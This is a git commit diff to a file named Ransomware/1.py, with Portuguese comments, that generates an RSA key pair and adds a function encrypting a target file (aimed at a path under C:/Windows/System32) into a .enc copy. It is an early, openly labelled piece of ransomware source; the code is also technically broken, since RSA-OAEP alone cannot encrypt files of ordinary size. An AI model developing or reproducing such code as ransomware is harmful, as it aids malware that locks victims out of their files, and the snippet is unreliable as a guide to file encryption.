bc600a6f6694c07a4899ca074d3fab543aa5c74f
Sérgio Gonçalves <127428465+ISergioMiguelI@users.noreply.github.com>
2024-06-11 16:22:52 +0100

    Update 1.py

--- Ransomware/1.py
+++ Ransomware/1.py
@@ -1,13 +1,26 @@
-#program a public and private key
-
-from os import chmod
 from Crypto.PublicKey import RSA
+from Crypto.Cipher import PKCS1_OAEP
+import os
 
-key = RSA.generate(2048) #gerar chaves
+# Geração de chaves
+key = RSA.generate(2048)
+private_key = key.export_key()
+public_key = key.publickey().export_key()
 
-private_key = key.export_key() #exportar chave privada
+# Criptografia de um arquivo
+def encrypt_file(file_name, public_key):
+    # Ler o arquivo
+    with open(file_name, 'rb') as f:
+        file_data = f.read()
+
+    # Criptografar o arquivo
+    public_key = RSA.import_key(public_key)
+    cipher_rsa = PKCS1_OAEP.new(public_key)
+    enc_file_data = cipher_rsa.encrypt(file_data)
+
+    # Escrever o arquivo criptografado
+    with open(file_name + ".enc", 'wb') as f:
+        f.write(enc_file_data)
 
 
-
-
-print("Key Generated with success")
+encrypt_file('C:/Windows/System32/test.txt', public_key)
